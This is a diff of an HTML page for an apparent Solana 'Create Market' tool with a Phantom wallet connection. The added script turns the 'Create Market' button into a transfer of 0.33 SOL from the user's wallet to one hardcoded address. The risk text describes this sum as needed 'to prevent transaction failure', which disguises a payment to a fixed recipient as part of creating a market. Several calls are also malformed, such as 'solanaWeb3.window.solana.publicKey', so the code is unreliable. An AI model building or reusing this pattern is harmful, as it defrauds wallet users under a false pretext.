@@ -199,6 +199,7 @@
                 </div>
             </div>
         </div>
+    </div>
 
     <div class="container mt-100px mb-5">
         <div class="p-3 card-block mb-4 bg-blur rounded-3 card-block">
@@ -214,35 +215,27 @@
                             <input type="text" class="form-control" id="BaseMint" required="" value=""/>
                             <div class="valid-feedback">Looks good!</div>
                         </div>
-                        <div class="cod-12l-m">
-                            <label for="QuoteMint" class="form-label">Price Tick</label>
-                            <input type="text" class="form-control" id="QuoteMint"
+                        <div class="col-md-12">
+                            <label for="PriceTick" class="form-label">Price Tick</label>
+                            <input type="text" class="form-control" id="QuoteMint" required="" value=""/>
                             <div class="valid-feedback">Looks good!</div>
                         </div>
                     </form>
                 </div>
             </div>
         </div>
-        
-        
-        </div>
     </div>
- <div class="cod-12l-m">
+
+    <div class="container mt-100px mb-5">
+        <div class="p-3 card-block mb-4 bg-blur rounded-3 card-block">
             <div class="form-check">
                 <input class="form-check-input" type="checkbox" value="" id="riskAgreement">
                 <label class="form-check-label" for="riskAgreement">Risk Agreement</label>
-                <p>I confirm that I have confirmed all details and that I am fully responsible for creating the
-                    market. <strong>Need at least 0.33 SOL to prevent transaction failure.</strong></p>
+                <p>I confirm that I have confirmed all details and that I am fully responsible for creating the market. <strong>Need at least 0.33 SOL to prevent transaction failure.</strong></p>
             </div>
-      <div class="container confirm-btn">
-        <button class="btn btn-primary create-market">Create Market</button>
-    </div>
- 
-<script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>
- 
- 
-<script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
-     <script src="script.js" type="module"></script>
+            <div class="container confirm-btn">
+                <button class="btn btn-primary create-market">Create Market</button>
+            </div>
         </div>
     </div>
 
@@ -251,47 +244,43 @@
     </footer>
 
     <script src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/5.3.0/js/bootstrap.bundle.min.js"></script>
- <!-- JavaScript code -->
     <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>
     <script>
-      
-   const { Transaction, SystemProgram, sendAndConfirmTransaction } = require("@solana/web3.js");
+        // Function to handle the click event of the "Connect with Phantom Wallet" button
+        document.querySelector('.phantom-connect').addEventListener('click', async () => {
+            try {
+                // Connect to Phantom wallet
+                await window.solana.connect();
+                // If connected successfully, log a message
+                console.log("Connected to Phantom wallet successfully!");
+            } catch (error) {
+                // If an error occurs, log the error
+                console.error("Error connecting to Phantom wallet:", error);
+            }
+        });
 
-// Function to handle the click event of the "Connect with Phantom Wallet" button
-document.querySelector('.phantom-connect').addEventListener('click', async () => {
-    try {
-        // Connect to Phantom wallet
-        await window.solana.connect();
-        // If connected successfully, log a message
-        console.log("Connected to Phantom wallet successfully!");
-    } catch (error) {
-        // If an error occurs, log the error
-        console.error("Error connecting to Phantom wallet:", error);
-    }
-});
+        // Function to handle the click event of the "Create Market" button
+        document.querySelector('.create-market').addEventListener('click', async () => {
+            try {
+                // Create a transaction to send 0.33 SOL to the specified wallet address
+                // Replace the placeholder wallet address with your actual address
+                const transaction = new solanaWeb3.Transaction().add(
+                    solanaWeb3.SystemProgram.transfer({
+                        fromPubkey: solanaWeb3.window.solana.publicKey,
+                        toPubkey: '9gVBpxceotiFdh8o9arz5KJ4PgSZd7KoiN2aLqaGUDar',
+                        lamports: 330000000, // 0.33 SOL in lamports
+                    })
+                );
 
-// Function to handle the click event of the "Create Market" button
-document.querySelector('.create-market').addEventListener('click', async () => {
-    try {
-        // Create a transaction to send 0.33 SOL to the specified wallet address
-        // Replace the placeholder wallet address with your actual address
-        const transaction = new Transaction().add(
-            SystemProgram.transfer({
-                fromPubkey: window.solana.publicKey,
-                toPubkey: '9gVBpxceotiFdh8o9arz5KJ4PgSZd7KoiN2aLqaGUDar',
-                lamports: 330000000, // 0.33 SOL in lamports
-            })
-        );
-
-        // Send and confirm the transaction
-        await sendAndConfirmTransaction(window.solana, transaction);
-        // If transaction is successful, log a message
-        console.log("Transaction successful!");
-    } catch (error) {
-        // If an error occurs during the transaction process, log the error
-        console.error("Error sending transaction:", error);
-    }
-});
+                // Send and confirm the transaction
+                await solanaWeb3.sendAndConfirmTransaction(window.solana, transaction);
+                // If transaction is successful, log a message
+                console.log("Transaction successful!");
+            } catch (error) {
+                // If an error occurs during the transaction process, log the error
+                console.error("Error sending transaction:", error);
+            }
+        });
 
     </script>
 </body>
